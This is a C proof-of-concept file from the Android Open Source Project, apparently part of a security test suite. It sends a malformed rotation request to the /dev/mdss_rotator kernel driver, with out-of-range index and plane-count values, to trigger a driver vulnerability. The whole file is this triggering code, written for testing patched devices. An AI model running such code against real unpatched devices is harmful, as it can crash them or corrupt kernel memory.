/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


#define GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ion.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include "local_poc.h"

int fd;
int id;

int main(int argc, char **argv) {
  int ret, i, count;
  struct mdp_rotation_request req;
  struct mdp_rotation_item item;

  struct mdp_rotation_config config;

  fd = open("/dev/mdss_rotator", O_RDONLY, 0);
  if (fd < 0) {
    return -1;
  }

  config.input.format = MDP_Y_CBCR_H2V2;
  config.output.format = MDP_Y_CBCR_H2V2;
  config.input.height = 4;
  config.input.width = 4;
  config.output.height = 4;
  config.output.width = 4;
  config.flags = 0;
  ret = ioctl(fd, MDSS_ROTATION_OPEN, &config);
  if (ret < 0) {
    goto failed;
  } else {
    id = config.session_id;
  }

  item.wb_idx = 0xFFFFFFFF;
  item.pipe_idx = item.wb_idx;
  item.session_id = id;

  item.src_rect.w = config.input.width;
  item.src_rect.h = config.input.height;
  item.input.format = config.input.format;

  item.dst_rect.w = config.output.width;
  item.dst_rect.h = config.output.height;
  item.output.format = config.output.format;

  item.src_rect.x = 1;
  item.src_rect.y = 1;
  item.dst_rect.x = 1;
  item.dst_rect.y = 1;

  item.input.width = 8;
  item.input.height = 8;
  item.output.height = 8;
  item.output.width = 8;

  item.input.plane_count = 0x0000FFFF;
  req.count = 1;
  req.list = &item;
  req.flags = 0;
  ret = ioctl(fd, MDSS_ROTATION_REQUEST, &req);

  failed:
    close(fd);

  return 0;
}
